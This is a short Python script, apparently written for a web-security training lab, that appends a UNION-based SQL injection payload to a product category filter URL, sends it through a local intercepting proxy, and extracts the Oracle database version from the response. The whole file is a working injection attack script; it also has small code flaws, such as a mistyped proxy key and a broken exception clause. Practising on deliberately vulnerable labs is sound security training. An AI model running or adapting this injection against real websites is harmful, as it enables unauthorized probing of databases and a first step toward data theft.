import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https:': 'https://127.0.0.1:8080'}

def exploit_sql_version(url):
    
    #!! these two variables vary from different websites
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    
    # Filter the response text to extract only the Oracle Database versions
    if "Oracle Database" in res:
        print("[+] Found the oracle database version.")
        
        ## Use BeautifulSoup library to extract the specific text line/string
        soup = BeautifulSoup(res, 'html.parser') # initializing
        version = soup.find(text=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The oracle database version is: " + version)
        
        # If all is well and completed, return True
        return True
    
    # return False if no traces of oracle database string matching in the response
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip() # getting the user input
    except IndexError():
        # if any error i.e. URL not provided, provide elaborations to the user
        
        ## Explain usage instruction to the user
        print("[-] Usage: %s <url>" % sys.argv[0])
        # argv[0] typically contains name of the script being executed
        # 2 other ways to write this line of code
        print("[-] Usage: {} <url>".format(sys.argv[0]))
        print(f"[-] Usage: {sys.argv[0]} <url>")
        
        ## Provide an example to the user
        print(f"[-] Example: {sys.argv[0]} <url>")
        
        ## Exit with an error code
        sys.exit(-1)
    
    print("[+] Dumping the version of the database...")
    
    ## Call the function, and if it returns false
    if not exploit_sql_version(url):
        print("[-] The oracle database version not found.")